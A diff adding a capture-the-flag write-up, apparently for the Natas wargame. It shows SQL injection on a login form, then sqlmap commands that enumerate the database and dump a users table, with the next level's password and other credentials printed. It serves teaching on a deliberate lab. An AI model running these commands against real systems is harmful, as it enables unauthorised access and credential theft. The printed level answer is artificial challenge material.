@@ -1,0 +1,32 @@
+We are given a login form and it's source code. 
+In the source code we can see there's no sanitization of the input so we might actually be able to attack this!
+
+Let's do some Sql Injections!
+Let's type " in each parameter and try to login. We get an error! It's vulnerable!
+
+Now since it's a POST request we'll use burp to get the request, save it to a file to use it with sqlmap.
+
+Now, let's do the following commands, one by one:
+
+sqlmap -r sqli13
+
+sqlmap -r sqli13 --dbs
+
+sqlmap -r sqli13 -D natas14 --tables
+
+sqlmap -r sqli13 -D natas14 -T users --dump-all
+
+We'll be returned this:
+
++--------------------------------------+----------------------------------+
+| username                             | password                         |
++--------------------------------------+----------------------------------+
+| natas15                              | AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J |
+| bob                                  | Dl2FB9O9op                       |
+| charlie                              | ikWGV9zc1i                       |
+| you obviously know how to use sqlmap | keep up the good work            |
+| alice                                | PnRTQEtfkd                       |
++--------------------------------------+----------------------------------+
+
+
+Success!!!
